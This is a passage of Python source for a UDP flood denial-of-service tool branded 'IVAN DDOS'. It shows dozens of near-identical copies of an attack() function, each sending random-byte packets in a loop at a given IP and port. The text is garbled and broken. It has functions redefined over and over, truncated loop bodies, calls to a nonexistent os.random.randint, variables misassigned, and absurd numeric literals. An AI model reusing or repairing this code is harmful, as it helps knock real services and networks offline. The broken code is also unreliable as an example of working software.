        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
